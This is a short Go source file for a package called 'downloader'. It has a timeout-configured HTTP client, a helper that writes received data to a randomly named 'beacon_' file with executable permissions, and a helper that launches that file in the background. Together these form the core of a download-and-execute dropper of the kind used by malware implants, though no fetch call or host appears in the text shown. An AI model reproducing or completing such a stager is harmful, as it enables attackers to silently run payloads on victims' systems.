package downloader

import (
	"encoding/base64"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
)

// httpClient returns a new HTTP client with appropriate timeouts set.
func httpClient() *http.Client {
	var d = &net.Dialer{
		Timeout: 5 * time.Second,
	}

	var tr = &http.Transport{
		Dial:                d.Dial,
		TLSHandshakeTimeout: 5 * time.Second,
	}

	return &http.Client{
		Timeout:   10 * time.Second,
		Transport: tr,
	}
}

func filename() string {
	b := make([]byte, 6)

	rand.Seed(time.Now().Unix())
	rand.Read(b)

	return "beacon_" + base64.StdEncoding.EncodeToString(b)
}

func save(data []byte) string {
	name := filename()
	f, err := os.OpenFile(name, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0755)
	if err != nil {
		return ""
	}

	f.Write(data)
	f.Close()

	return name
}

func run(filename string) {
	cmd := exec.Command("./" + filename)
	cmd.Start()
}
